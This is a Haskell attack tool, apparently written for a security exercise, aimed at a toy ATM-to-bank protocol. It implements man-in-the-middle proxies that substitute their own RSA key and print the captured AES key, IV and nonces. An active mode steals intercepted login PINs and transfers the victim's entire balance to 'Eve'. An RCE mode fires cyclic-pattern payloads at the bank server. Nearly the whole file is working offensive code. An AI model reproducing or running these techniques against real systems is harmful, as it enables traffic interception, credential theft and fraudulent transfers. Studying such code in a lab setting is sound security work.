-- Hackage dependencies: asn1-encoding cryptonite network
{-# LANGUAGE NoMonomorphismRestriction, OverloadedStrings #-}
import Control.Applicative
import Control.Concurrent
import Control.Monad
import Crypto.Cipher.AES
import Crypto.Cipher.Types
import Crypto.Error
import Crypto.Hash.Algorithms
import Crypto.PubKey.RSA
import Crypto.PubKey.RSA.OAEP
import Crypto.Random
import Data.ASN1.BinaryEncoding
import Data.ASN1.BitArray
import Data.ASN1.Encoding
import Data.ASN1.Types
import Data.Char
import Data.Maybe
import Data.Word
import Network
import Network.Socket.ByteString
import System.Environment
import System.Exit
import System.Timeout
import System.IO
import qualified Data.ByteString as B
import qualified Data.ByteString.Char8
import qualified Data.ByteString.Lazy as L

readMaybe = fmap fst . listToMaybe . reads

lToStrict = B.concat . L.toChunks
stringToBS = B.pack . map (fromIntegral . ord)
bsToString = map (chr . fromIntegral) . B.unpack

port = PortNumber . fromIntegral
unPort (PortNumber x) = x

showHelp = do
    name <- getProgName
    putStrLn $ "Usage: " ++ name ++ "EXPLOIT_NAME ATM_PORT BANK_PORT"
    putStrLn $ "EXPLOIT_NAME = PassiveMITM | ActiveMITM | ExceptionDOS | RCE"
    exitFailure

main = withSocketsDo $ getArgs >>= main'

validatePorts atmPort bankPort = (atmPort', bankPort') where
    atmPort' = maybe (error "Failed to parse atmPort") port $ readMaybe atmPort
    bankPort' = maybe (error "Failed to parse bankPort") port $ readMaybe bankPort

main' ["PassiveMITM", atmPort', bankPort'] = do
    let (atmPort, bankPort) = validatePorts atmPort' bankPort'
    listener <- listenOn atmPort
    forever $ accept listener >>= forkIO . doMitm bankPort False

main' ["ActiveMITM", atmPort', bankPort'] = do
    let (atmPort, bankPort) = validatePorts atmPort' bankPort'
    listener <- listenOn atmPort
    forever $ accept listener >>= forkIO . doMitm bankPort True

main' ["ExceptionDOS", atmPort', bankPort'] = do
    let (_, bankPort) = validatePorts atmPort' bankPort'
    -- TODO: merge brian's exploit code
    return ()

main' ["RCE", atmPort', bankPort'] = do
    let (_, bankPort) = validatePorts atmPort' bankPort'
    handshakeExploit bankPort

main' (unrecognized:_) = do
    putStrLn $ "Unrecognized exploit name: " ++ unrecognized
    showHelp

main' _ = showHelp

dumbProxy atm bank logTo logFrom = loop where
    bufferSize = 4096
    loop = do
        atmEOF <- hIsEOF atm
        unless atmEOF $ do
            B.hGetSome atm bufferSize >>= logTo >>= B.hPut bank
            bankEOF <- hIsEOF bank
            unless bankEOF $ do
                B.hGetSome bank bufferSize >>= logFrom >>= B.hPut atm
                loop

expect h s = do
    s' <- B.hGetSome h (B.length s)
    unless (s == s') $ error "expect: unexpected input"

decodeX509Pubkey :: L.ByteString -> Maybe PublicKey
decodeX509Pubkey x = case decodeASN1 BER x of
    Right [Start Sequence,
        Start Sequence, OID [1,2,840,113549,1,1,1], Null, End Sequence,
        BitString (BitArray size s), End Sequence] ->
            case decodeASN1 BER (L.fromChunks [s]) of
                Right [Start Sequence, IntVal n, IntVal e, End Sequence] ->
                    Just (PublicKey (fromIntegral size `div` 8) n e)
                _ -> Nothing
    _ -> Nothing

encodeX509Pubkey :: PublicKey -> B.ByteString
encodeX509Pubkey (PublicKey size n e) = lToStrict $ encodeASN1 DER [Start Sequence,
        Start Sequence, OID [1,2,840,113549,1,1,1], Null, End Sequence,
        BitString (BitArray (fromIntegral size) s), End Sequence] where
    s = lToStrict $ encodeASN1 DER [Start Sequence, IntVal n, IntVal e, End Sequence]

makeAES :: B.ByteString -> AES128
makeAES key = either (error . show) id . eitherCryptoError $ cipherInit key

mitmHandshake atm bank logTo logFrom = do
    let bufferSize = 4096
    let pubSizeBits = 3072
    expect atm "DUMMY"
    B.hPut bank "DUMMY"
    bankPubRaw <- B.hGetSome bank bufferSize
    (mitmPub, mitmPriv) <- generate (pubSizeBits `div` 8) 0x10001
    let mitmDecrypt = (either (error . show) id) . decrypt Nothing (defaultOAEPParams SHA1) mitmPriv
    let bankPub = maybe (error "Failed to decode bank pubkey") id $ decodeX509Pubkey (L.fromChunks [bankPubRaw])
    --print bankPub
    --print mitmPub
    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
    let pubEncrypt = fmap (either (error . show) id) . encrypt (defaultOAEPParams SHA1) bankPub'
    print bankPub'
    B.hPut atm (encodeX509Pubkey mitmPub)
    encAES <- B.hGetSome atm bufferSize
    let rawAES = mitmDecrypt encAES
    putStr "Raw AES key: " >> print rawAES
    let aes = makeAES rawAES
    mitmAES <- pubEncrypt rawAES
    B.hPutStr bank mitmAES -- TODO: memory corruption exploit
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    encIV <- B.hGetSome atm bufferSize
    let rawIV = mitmDecrypt encIV
    putStr "Raw AES IV: " >> print rawIV
    mitmIV <- pubEncrypt rawIV
    B.hPutStr bank mitmIV
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    encNonce <- B.hGetSome atm bufferSize
    let Just aesIV = makeIV rawIV
    let rawNonce = cfbDecrypt aes aesIV encNonce
    putStr "Raw Initial Nonce: "
    print rawNonce
    let mitmNonce = cfbEncrypt aes aesIV rawNonce
    B.hPutStr bank mitmNonce
    expect bank "DUMMY"
    B.hPut atm "DUMMY"
    return (aes, aesIV)

handshakeExploit bankPort = do
    let bufferSize = 4096
    let pubSizeBits = 3072
    let sendPayload h payload k = do
        B.hPut h "DUMMY"
        bankPubRaw <- B.hGetSome h bufferSize
        let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
        let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
        --print bankPub'
        putStr "Raw Payload: "
        print $ payload
        Right encPayload <- encrypt (defaultOAEPParams SHA1) bankPub' $ payload
        putStr "Encrypted Payload: "
        print $ encPayload
        B.hPutStr h encPayload
        k h bankPub'
    {-
    let continuation1 h bankPub' = do
        Right encIV <- encrypt (defaultOAEPParams SHA1) bankPub' $ B.replicate 20 0x43
        expect h "DUMMY"
        B.hPutStr h encIV
        B.hPutStr h "dummy"
        expect h "DUMMY"
        hClose h
        putStrLn "end"
    -}
    let continuation2 h _ = do
        hClose h
    --let payload = B.replicate 342 0x41
    let payload1 = "AAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAALAAAMAAANAAAOAAAPAAAQAAARAAASAAATAAAUAAAVAAAWAAAXAAAYAAAZAABBAABCAABDAABEAABFAABGAABHAABIAABJAABKAABLAABMAABNAABOAABPAABQAABRAABSAABTAABUAABVAABWAABXAABYAABZAACBAACCAACDAACEAACFAACGAACHAACIAACJAACKAACLAACMAACNAACOAACPAACQAACRAACSAACTAACUAACVAACWAACXAACYAACZAADBAADCAADDAADEAADFAADGAADHAADIAADJAADKA"
    let payload2 = "ZZZZYZZZXZZZWZZZVZZZUZZZTZZZSZZZRZZZQZZZPZZZOZZZNZZZMZZZLZZZKZZZJZZZIZZZHZZZGZZZFZZZEZZZDZZZCZZZBZZZAZZYYZZYXZZYWZZYVZZYUZZYTZZYSZZYRZZYQZZYPZZYOZZYNZZYMZZYLZZYKZZYJZZYIZZYHZZYGZZYFZZYEZZYDZZYCZZYBZZYAZZXYZZXXZZXWZZXVZZXUZZXTZZXSZZXRZZXQZZXPZZXOZZXNZZXMZZXLZZXKZZXJZZXIZZXHZZXGZZXFZZXEZZXDZZXCZZXBZZXAZZWYZZWXZZWWZZWVZZWUZZWTZZWSZZWRZZWQZZWPZ"
    --let payload = B.concat [B.replicate 36 0x41, B.replicate 4 1, B.replicate 302 0x42]
    --let payload = payload'
    bank1 <- connectTo "localhost" bankPort
    sendPayload bank1 payload1 continuation2
    bank2 <- connectTo "localhost" bankPort
    sendPayload bank2 payload2 continuation2

data ActionType = Balance | Deposit | Login | Logout | Malformed | Transfer | Unknown | Withdraw
    deriving (Enum, Eq, Show)

data Action = Action {
    actUser :: B.ByteString,
    actPin :: B.ByteString,
    actOldNonce :: B.ByteString,
    actNewNonce :: B.ByteString,
    actCmd :: ActionType,
    actAmount :: Int, -- cents
    actRecipient :: B.ByteString
    } deriving Show

deserializeAction :: B.ByteString -> Maybe Action
deserializeAction s = aux where
    readB = readMaybe . bsToString
    split' c = B.split (fromIntegral $ ord c)
    aux = case map (split' ';') $ split' ':' s of
        [[oldNonce, newNonce],[_],[user,pin,cmd,amount,recipient],[_]] -> do
            cmd' <- readB cmd
            return $ Action {
                actUser = user,
                actPin = pin,
                actOldNonce = oldNonce,
                actNewNonce = newNonce,
                actCmd = toEnum cmd',
                actAmount = maybe 0 id $ readB amount,
                actRecipient = recipient
                }
        _ -> Nothing

serializeAction :: MonadRandom m => Action -> m B.ByteString
serializeAction (Action user pin oNonce nNonce cmd amt reci) = do
    let actionBufferSize = 128
    let cmd' = stringToBS . show $ fromEnum cmd
    let amt' = stringToBS $ show amt
    let pad1Size = 1
    let pad2Size = actionBufferSize - (sum (map B.length [oNonce, nNonce, user, pin, cmd', amt', reci]) + 8 + pad1Size)
    --pad1 <- getRandomBytes pad1Size
    --pad2 <- getRandomBytes pad2Size
    let pad1 = B.replicate pad1Size 0x41
    let pad2 = B.replicate pad2Size 0x42
    return $ B.intercalate ":" [
        B.intercalate ";" [oNonce, nNonce],
        pad1,
        B.intercalate ";" [user, pin, cmd', amt', reci],
        pad2
        ]

-- unfortunately, this is checked for, and the server prints "These shouldn't happen." to stdout
replaceLogoutWithDeposit aes aesIv action ctxt = if actCmd action == Logout
    then do
        let action' = action { actCmd = Deposit, actAmount = 31337 } 
        ptxt' <- serializeAction action'
        return $ cfbEncrypt aes aesIv ptxt'
    else return ctxt

-- semicolons/colons in the nonce will mess things up, use constant A's for now
--makeNonce = getRandomBytes 16
makeNonce = return $ B.replicate 15 0x41

nextNonce :: MonadRandom m => Action -> m Action
nextNonce a@(Action {actNewNonce = oldNonce}) = do
    newNonce <- makeNonce
    return $ a { actOldNonce = oldNonce, actNewNonce = newNonce }

frontRunLogin bankPort username pin = do
    let bufferSize = 4096
    let pubSizeBits = 3072
    putStrLn $ "Intercepted creds " ++ show username ++ ":" ++ show pin
    putStrLn "Transferring everything to Eve"
    bank <- connectTo "localhost" bankPort
    hSetBuffering bank (BlockBuffering (Just bufferSize))
    let putFlush x = B.hPut bank x >> hFlush bank
    putFlush "DUMMY"
    bankPubRaw <- B.hGetSome bank bufferSize
    let bankPub = maybe (error "Failed to decode bank pubkey") id $ decodeX509Pubkey (L.fromChunks [bankPubRaw])
    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
    let pubEncrypt = fmap (either (error . show) id) . encrypt (defaultOAEPParams SHA1) bankPub'
    rawAES <- getRandomBytes 16
    let aes = makeAES rawAES
    mitmAES <- pubEncrypt rawAES
    putFlush mitmAES
    expect bank "DUMMY"
    rawIV <- getRandomBytes 16
    mitmIV <- pubEncrypt rawIV
    putFlush mitmIV
    expect bank "DUMMY"
    let Just aesIV = makeIV rawIV
    rawNonce <- makeNonce
    let mitmNonce = cfbEncrypt aes aesIV rawNonce
    putFlush mitmNonce
    expect bank "DUMMY"
    let enc = cfbEncrypt aes aesIV
    let dec = cfbDecrypt aes aesIV
    let sendAction a = do
        --putStr "Sending: " >> print a
        a' <- serializeAction a
        --print a'
        let a'' = enc a'
        --print a''
        putFlush a''
    let getAction k = do
        tmp <- B.hGetSome bank bufferSize
        --print tmp
        let tmp' = dec tmp
        --print tmp'
        let r = deserializeAction tmp'
        --print r
        case r of
            Nothing -> return ()
            Just r' -> k r'
    let updateAction a f = fmap f $ nextNonce a
    newNonce <- makeNonce
    let a1 = Action username pin rawNonce newNonce Login 0 ""
    sendAction a1
    getAction $ \r1 -> do
        a2 <- updateAction r1 $ (\a -> a {actCmd = Balance})
        sendAction a2
        getAction $ \r2 -> do
            let f = (\a -> a {actCmd = Transfer, actRecipient = "Eve", actAmount = actAmount r2})
            a3 <- updateAction r2 f
            sendAction a3
            getAction $ \r3 -> do
                a4 <- updateAction r3 $ (\a -> a {actCmd = Logout})
                sendAction a4
                getAction $ \r4 -> if actCmd r4 == Malformed
                    then putStrLn "Transfer failed"
                    else putStrLn "Transfer successful"

    return ()

passiveMitm atm bank logTo logFrom aes aesIv intercept = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
    bufferSize = 4096
    wrap log ctxt = do
        let ptxt = cfbDecrypt (aes :: AES128) aesIv ctxt
        let action = deserializeAction ptxt
        case deserializeAction ptxt of
            Just action -> do
                log (stringToBS $ show action)
                --replaceLogoutWithDeposit aes aesIv action ctxt
                timeout (5*10^6) $ intercept action
                return ctxt
            _ -> do
                log ptxt
                return ctxt

doMitm bankPort active (atm, host, atmPort) = do
    putStrLn $ "Received a connection from " ++ host ++ ":" ++ show atmPort
    putStrLn $ "Forwarding to localhost:" ++ show (unPort bankPort)
    bank <- connectTo "localhost" bankPort
    let log p q s = (putStrLn $ show p ++ " -> " ++ show q ++ ": " ++ show s) >> return s
    let logTo = log atmPort (unPort bankPort) :: B.ByteString -> IO B.ByteString
    let logFrom = log (unPort bankPort) atmPort  :: B.ByteString -> IO B.ByteString
    --dumbProxy atm bank logTo logFrom
    let intercept action = if not active then return () else do
        when (actCmd action == Login && B.length (actPin action) > 0) $ do
            frontRunLogin bankPort (actUser action) (actPin action)
    (aes, aesIV) <- mitmHandshake atm bank logTo logFrom
    passiveMitm atm bank logTo logFrom aes aesIV intercept
